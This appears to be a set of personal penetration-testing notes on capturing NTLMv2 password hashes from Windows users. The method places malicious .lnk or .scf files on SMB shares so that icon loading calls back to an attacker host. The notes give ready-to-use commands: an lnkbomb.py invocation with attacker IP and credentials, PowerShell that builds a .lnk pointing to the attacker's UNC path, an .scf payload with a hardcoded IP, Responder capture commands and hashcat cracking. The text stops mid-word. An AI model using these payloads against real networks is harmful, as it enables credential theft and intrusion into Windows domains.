## .lnk (works on AD 2019)

link bomb takes advantage of how windows loads icons for .lnk files simillar to scf, if we place a file with it's icon path pointing to attacker server, its possible to capture user NTLMV2 hashes if they browse the directory where the .lnk file is located.
## Printers and Windows
file upload to printer portal may be configured to save the files in an SMB Server
## Capturing Hashes with a Malicious .lnk File

Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file. We can use various tools to generate a malicious .lnk file, such as 
`create a malicious .lnk  and upload to an smb server`
```
python3 .\lnkbomb.py -t <smbtarget-IP> -a <attacker-ip> -s Shared -u themayor -p Password123! -n dc01 --windows
```

`start a relay/capturer`
```

responder -I tun0 -v -dwFP
```

. We can also make one using a few lines of PowerShell:
#### Generating a Malicious .lnk File
```powershell-session

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "description1"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
browsing a directory where this file is saved will trigger a connection back

---
## scf: 2016 - 
An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. 
- If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share.
## impact:
- Capture ntlm hash for any user trying to access our share
### steps

- create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). 
- We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here 
- we put in our `tun0` IP address and any fake share name and .ico file name.
```shell-session
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
#### Starting Responder
```shell-session
$ sudo responder -wrf -v -I tun0
```

```shell-session
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
and e
